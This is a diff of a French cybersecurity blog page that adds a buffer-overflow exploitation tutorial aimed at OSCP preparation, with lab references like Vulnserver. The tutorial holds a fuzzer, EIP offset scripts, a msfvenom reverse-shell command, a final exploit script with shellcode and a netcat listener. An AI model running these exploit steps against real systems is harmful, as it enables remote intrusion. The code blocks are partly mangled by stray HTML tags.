@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Buffer Overflow : comprendre et exploiter les débordements — Temgus.CyberBlog</title>
 <meta name="description" content="Stack BOF, contrôle EIP, shellcode, JMP ESP et protections modernes (ASLR, DEP, canaries).">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/buffer-overflow.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/buffer-overflow.html">
 <meta property="og:title" content="Buffer Overflow : comprendre et exploiter les débordements — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Buffer Overflow : comprendre et exploiter les débordements — Temgus.CyberBlog">
 <meta name="twitter:description" content="Stack BOF, contrôle EIP, shellcode, JMP ESP et protections modernes (ASLR, DEP, canaries).">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,546 @@
   "headline": "Buffer Overflow : comprendre et exploiter les débordements",
   "description": "Stack BOF, contrôle EIP, shellcode, JMP ESP et protections modernes (ASLR, DEP, canaries).",
   "datePublished": "2025-06-10",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/buffer-overflow.html",
   "inLanguage": "fr",
   "keywords": "buffer overflow, BOF, OSCP, exploitation",
-  "timeRequired": "PT11M"
+  "timeRequired": "PT11M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">💻</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Buffer Overflow : comprendre et exploiter les débordements</h1>
-  <p style="color:#8892a4;max-width:500px">Stack BOF, contrôle EIP, shellcode, JMP ESP et protections modernes (ASLR, DEP, canaries).</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#buffer-overflow" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">💻</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Buffer Overflow : comprendre et exploiter les débordements</div>
+      <div class="meta-details">
+        <span>📅 2025-06-10</span>
+        <span>⏱ 11 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#qu-est-ce-qu-un-buffer-overflow-">Qu'est-ce qu'un buffer overflow ?</a></li>
+<li><a href="#la-m-moire-du-programme-stack-">La mémoire du programme (Stack)</a></li>
+<li><a href="#les-tapes-d-exploitation">Les étapes d'exploitation</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#-tape-1-fuzzing-trouver-le-crash">Étape 1 : Fuzzing — trouver le crash</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#-tape-2-contr-ler-eip-trouver-l-offset-exact">Étape 2 : Contrôler EIP — trouver l'offset exact</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#-tape-3-trouver-les-bad-characters">Étape 3 : Trouver les bad characters</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#-tape-4-trouver-un-jmp-esp">Étape 4 : Trouver un JMP ESP</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#-tape-5-g-n-rer-le-shellcode">Étape 5 : Générer le shellcode</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#-tape-6-exploit-final">Étape 6 : Exploit final</a></li>
+<li><a href="#protections-modernes-contre-les-bof">Protections modernes contre les BOF</a></li>
+<li><a href="#bof-en-2024-o-a-existe-encore-">BOF en 2024 — Où ça existe encore ?</a></li>
+<li><a href="#ressources-pour-apprendre">Ressources pour apprendre</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Buffer Overflow : comprendre et exploiter les débordements de tampon</h1>
+
+<p>Le buffer overflow est l'une des vulnérabilités les plus classiques et les plus fondamentales en sécurité informatique. Présente depuis les années 1980, elle reste d'actualité et est obligatoire pour l'examen OSCP. Ce guide explique le mécanisme de fond en comble.</p>
+
+<h2 id="qu-est-ce-qu-un-buffer-overflow-">Qu'est-ce qu'un buffer overflow ?</h2>
+
+<pre><code class="language-c">// Programme C vulnérable
+<p>#include &lt;stdio.h&gt;</p>
+<p>#include &lt;string.h&gt;</p>
+
+<p>void fonction_vulnerable(char *input) {</p>
+<p>char buffer[64];  // Tampon de 64 octets</p>
+<p>strcpy(buffer, input);  // strcpy ne vérifie pas la taille !</p>
+<p>printf("Vous avez saisi : %s\n", buffer);</p>
+<p>}</p>
+
+<p>int main() {</p>
+<p>char user_input[256];</p>
+<p>gets(user_input);  // gets() ne limite pas non plus !</p>
+<p>fonction_vulnerable(user_input);</p>
+<p>return 0;</p>
+<p>}</p>
+
+<p>// Si input &gt; 64 octets → débordement dans la pile (stack)</p>
+<p>// Les octets supplémentaires écrasent d'autres données en mémoire</code></pre>
+
+<h2 id="la-m-moire-du-programme-stack-">La mémoire du programme (Stack)</h2>
+
+<pre><code>Organisation de la pile lors d'un appel de fonction :
+
+<p>Adresses hautes</p>
+<p>┌─────────────────────────┐</p>
+<p>│   Arguments de main()   │</p>
+<p>├─────────────────────────┤</p>
+<p>│   Adresse de retour     │  ← EIP/RIP (où reprendre après return)</p>
+<p>├─────────────────────────┤</p>
+<p>│   Saved EBP/RBP         │  ← Base Pointer sauvegardé</p>
+<p>├─────────────────────────┤</p>
+<p>│                         │</p>
+<p>│   buffer[64]            │  ← Notre buffer (croît vers le haut)</p>
+<p>│                         │</p>
+<p>└─────────────────────────┘</p>
+<p>Adresses basses</p>
+
+<p>Si on écrit &gt; 64 octets dans buffer :</p>
+<p>→ On écrase EBP sauvegardé</p>
+<p>→ On écrase l'ADRESSE DE RETOUR !</p>
+<p>→ Contrôle du flux d'exécution du programme</code></pre>
+
+<h2 id="les-tapes-d-exploitation">Les étapes d'exploitation</h2>
+
+<h3 id="-tape-1-fuzzing-trouver-le-crash">Étape 1 : Fuzzing — trouver le crash</h3>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+<h1>fuzzer.py - Trouver la taille exacte qui cause le crash</h1>
+
+<p>import socket</p>
+<p>import time</p>
+
+<p>ip = "192.168.1.100"</p>
+<p>port = 9999</p>
+<p>timeout = 5</p>
+
+<h1>Envoyer des buffers de taille croissante</h1>
+<p>buffer = b"A" * 100</p>
+
+<p>while True:</p>
+<p>try:</p>
+<p>with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</p>
+<p>s.settimeout(timeout)</p>
+<p>s.connect((ip, port))</p>
+<p>s.recv(1024)</p>
+<p>print(f"[*] Envoi de {len(buffer)} octets...")</p>
+<p>s.send(buffer + b"\r\n")</p>
+<p>s.recv(1024)</p>
+<p>except Exception as e:</p>
+<p>print(f"[!] CRASH probable à {len(buffer)} octets !")</p>
+<p>break</p>
+
+<p>time.sleep(1)</p>
+<p>buffer += b"A" * 100</code></pre>
+
+<h3 id="-tape-2-contr-ler-eip-trouver-l-offset-exact">Étape 2 : Contrôler EIP — trouver l'offset exact</h3>
+
+<pre><code class="language-bash"># Générer un pattern unique avec Metasploit
+<p>msf-pattern_create -l 2400</p>
+<h1>Génère : Aa0Aa1Aa2Aa3Aa4Aa5...</h1>
+
+<h1>Envoyer le pattern au programme vulnérable</h1>
+<h1>Quand il crash, noter la valeur dans EIP (ex: 6f43396e)</h1>
+
+<h1>Trouver l'offset exact</h1>
+<p>msf-pattern_offset -l 2400 -q 6f43396e</p>
+<h1>[*] Exact match at offset 1978</h1>
+<h1>EIP est écrasé après 1978 octets exactement !</code></pre></h1>
+
+<pre><code class="language-python"># Vérifier le contrôle d'EIP
+<p>import socket</p>
+
+<p>ip = "192.168.1.100"</p>
+<p>port = 9999</p>
+<p>offset = 1978</p>
+
+<p>buffer  = b"A" * offset          # Remplissage jusqu'à EIP</p>
+<p>buffer += b"BBBB"                 # EIP = 0x42424242 (BBBB) → on contrôle !</p>
+<p>buffer += b"C" * (2400 - offset - 4)  # Après EIP</p>
+
+<p>with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</p>
+<p>s.connect((ip, port))</p>
+<p>s.recv(1024)</p>
+<p>s.send(buffer + b"\r\n")</p>
+
+<h1>Si EIP = 42424242 dans le debugger → CONTRÔLE CONFIRMÉ !</code></pre></h1>
+
+<h3 id="-tape-3-trouver-les-bad-characters">Étape 3 : Trouver les bad characters</h3>
+
+<pre><code class="language-python"># Certains octets sont "mauvais" et tronquent le buffer
+<h1>\x00 (null byte), \x0a (newline), \x0d (carriage return)...</h1>
+
+<h1>Générer tous les octets de \x01 à \xff</h1>
+<p>badchars = b"".join(bytes([i]) for i in range(1, 256))</p>
+
+<p>buffer  = b"A" * offset</p>
+<p>buffer += b"BBBB"</p>
+<p>buffer += badchars  # Observer dans le debugger quels octets sont manquants</p>
+
+<h1>Dans Immunity Debugger / x64dbg :</h1>
+<h1>Chercher la chaîne dans la pile → voir où elle est tronquée</h1>
+<h1>L'octet manquant = bad character</code></pre></h1>
+
+<h3 id="-tape-4-trouver-un-jmp-esp">Étape 4 : Trouver un JMP ESP</h3>
+
+<pre><code class="language-bash"># EIP doit pointer vers notre shellcode
+<h1>Notre shellcode est dans ESP (après EIP dans la pile)</h1>
+<h1>Solution : trouver une instruction JMP ESP dans un module</h1>
+
+<h1>Dans Immunity Debugger avec Mona.py</h1>
+<p>!mona jmp -r esp -cpb "\x00\x0a\x0d"</p>
+<h1>-cpb : caractères à éviter (bad chars)</h1>
+<h1>Résultat : 0x625011af → adresse d'un JMP ESP sans bad chars</h1>
+
+<h1>Dans x64dbg :</h1>
+<h1>Chercher "FFE4" (opcode de JMP ESP) dans les modules</code></pre></h1>
+
+<h3 id="-tape-5-g-n-rer-le-shellcode">Étape 5 : Générer le shellcode</h3>
+
+<pre><code class="language-bash"># msfvenom - Générer un reverse shell
+<p>msfvenom -p windows/shell_reverse_tcp \</p>
+<p>LHOST=192.168.1.50 \</p>
+<p>LPORT=4444 \</p>
+<p>-b "\x00\x0a\x0d" \          # Bad chars à éviter</p>
+<p>-f python \</p>
+<p>-v shellcode</p>
+
+<h1>Résultat :</h1>
+<h1>shellcode =  b""</h1>
+<h1>shellcode += b"\xda\xca\xb8\xf2\x03\xa4\x0a\xd9\x74\x24\xf4"</h1>
+<h1>...</code></pre></h1>
+
+<h3 id="-tape-6-exploit-final">Étape 6 : Exploit final</h3>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+<h1>exploit.py - Exploit BOF complet</h1>
+
+<p>import socket</p>
+
+<p>ip = "192.168.1.100"</p>
+<p>port = 9999</p>
+
+<p>offset = 1978</p>
+<p>jmp_esp = b"\xaf\x11\x50\x62"  # 0x625011af en little-endian</p>
+<p>nop_sled = b"\x90" * 16  # NOP sled (atterrissage souple)</p>
+
+<h1>Shellcode généré par msfvenom</h1>
+<p>shellcode  = b""</p>
+<p>shellcode += b"\xda\xca\xb8\xf2\x03\xa4\x0a\xd9\x74\x24\xf4"</p>
+<p>shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x43\x17\x03\x43\x17"</p>
+<h1>... (shellcode complet)</h1>
+
+<p>buffer  = b"A" * offset      # Remplissage</p>
+<p>buffer += jmp_esp             # EIP → JMP ESP → notre shellcode</p>
+<p>buffer += nop_sled            # NOP sled pour absorber les petites erreurs</p>
+<p>buffer += shellcode           # Reverse shell</p>
+
+<p>print(f"[*] Envoi de l'exploit ({len(buffer)} octets)...")</p>
+
+<p>with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</p>
+<p>s.connect((ip, port))</p>
+<p>s.recv(1024)</p>
+<p>s.send(buffer + b"\r\n")</p>
+
+<p>print("[*] Exploit envoyé ! Attente du reverse shell...")</p>
+
+<h1>Sur la machine attaquante :</h1>
+<h1>nc -lvnp 4444</h1>
+<h1>→ Shell sur la machine vulnérable !</code></pre></h1>
+
+<h2 id="protections-modernes-contre-les-bof">Protections modernes contre les BOF</h2>
+
+<pre><code>ASLR (Address Space Layout Randomization) :
+<p>→ Randomise les adresses mémoire à chaque exécution</p>
+<p>→ JMP ESP à une adresse différente à chaque fois</p>
+<p>→ Bypass : information leak, brute force (32-bit), heap spray</p>
+
+<p>DEP/NX (Data Execution Prevention / No-Execute) :</p>
+<p>→ La pile n'est pas exécutable</p>
+<p>→ Le shellcode en pile ne peut pas s'exécuter</p>
+<p>→ Bypass : Return-Oriented Programming (ROP)</p>
+
+<p>Stack Canaries :</p>
+<p>→ Valeur aléatoire entre buffer et EIP</p>
+<p>→ Vérifiée avant le return → si modifiée → arrêt</p>
+<p>→ Bypass : information leak du canary</p>
+
+<p>SafeSEH / SEHOP :</p>
+<p>→ Protection des gestionnaires d'exceptions (SEH)</p>
+<p>→ Vérifie l'intégrité de la chaîne SEH</code></pre>
+
+<h2 id="bof-en-2024-o-a-existe-encore-">BOF en 2024 — Où ça existe encore ?</h2>
+
+<pre><code>Domaines encore vulnérables :
+
+<p>Systèmes embarqués (IoT) :</p>
+<p>→ Routeurs, cameras IP, SCADA/ICS</p>
+<p>→ Pas de ASLR/DEP sur systèmes anciens</p>
+<p>→ Langages C sans protections</p>
+
+<p>Applications legacy :</p>
+<p>→ Logiciels industriels datant des années 90-2000</p>
+<p>→ Protocoles réseau custom (Modbus, BACnet)</p>
+<p>→ Firmware non mis à jour</p>
+
+<p>CTF et OSCP :</p>
+<p>→ La compétence reste exigée pour OSCP</p>
+<p>→ Machines Vulnhub/HackTheBox avec BOF volontaires</p>
+<p>→ Buffer Overflow 32-bit = partie obligatoire de l'examen OSCP</code></pre>
+
+<h2 id="ressources-pour-apprendre">Ressources pour apprendre</h2>
+
+<pre><code class="language-bash"># Environnement de pratique
+<h1>Vulnserver (Windows) - BOF volontairement vulnérable</h1>
+<h1>https://github.com/stephenbradshaw/vulnserver</h1>
+
+<h1>Protostar (Linux) - Série de challenges BOF progressifs</h1>
+<h1>https://exploit.education/protostar/</h1>
+
+<h1>TryHackMe - Buffer Overflow Prep room</h1>
+<h1>https://tryhackme.com/room/bufferoverflowprep</h1>
+
+<h1>Pwndbg - Debugger GDB amélioré pour l'exploitation</h1>
+<p>pip install pwndbg</p>
+<h1>Commandes : checksec, vmmap, stack, cyclic</h1>
+
+<h1>Pwntools - Bibliothèque Python pour l'exploitation</h1>
+<p>pip install pwntools</p>
+<p>from pwn import *</p>
+<h1>p = remote('192.168.1.100', 9999)</h1>
+<h1>p.sendline(b'A' * offset + jmp_esp + shellcode)</code></pre></h1>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Le buffer overflow illustre les conséquences catastrophiques d'un simple manque de vérification de taille. Aujourd'hui, les protections (ASLR, DEP, canaries) rendent les exploitations plus complexes mais pas impossibles. La meilleure défense reste d'utiliser des langages sûrs (Rust, Go) ou des fonctions sécurisées (<code>strncpy</code> plutôt que <code>strcpy</code>, <code>fgets</code> plutôt que <code>gets</code>). Pour tout pentester, maîtriser le BOF basique reste incontournable — c'est obligatoire pour l'OSCP.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#buffer-overflow" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/steganographie.html" class="nav-prev">← Stéganographie : l'art de cacher des données</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/ctf-competitions.html" class="nav-next">CTF : les compétitions de hacking éthique →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
